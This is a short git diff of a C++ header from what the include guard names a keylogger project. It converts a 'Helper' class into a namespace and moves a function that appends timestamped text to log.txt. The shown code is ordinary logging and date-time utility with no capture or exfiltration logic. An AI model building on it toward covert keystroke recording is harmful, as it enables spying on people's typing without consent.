@@ -19,9 +19,8 @@ string toString(const T t)
     return str.str();
 }
 
-class Helper {
+namespace Helper {
 
-public:
     struct dateTime
     {
         int Day,Month,Year,Min,Hour,Seconds;
@@ -67,16 +66,16 @@ public:
         }
     };
 
-
+    void writeLog(const string s)
+    {
+        ofstream file("log.txt",ios::app);
+        file<<"["<< Helper::dateTime().getDateTime()<< "]"<<endl;
+        file<<s<<endl;
+        file.close();
+    }
 };
 
-void writeLog(const string s)
-{
-    ofstream file("log.txt",ios::app);
-    file<<"["<< Helper::dateTime().getDateTime()<< "]"<<endl;
-    file<<s<<endl;
-    file.close();
-}
+
 
 
 #endif //MYKEYLOGGER_HELPER_H
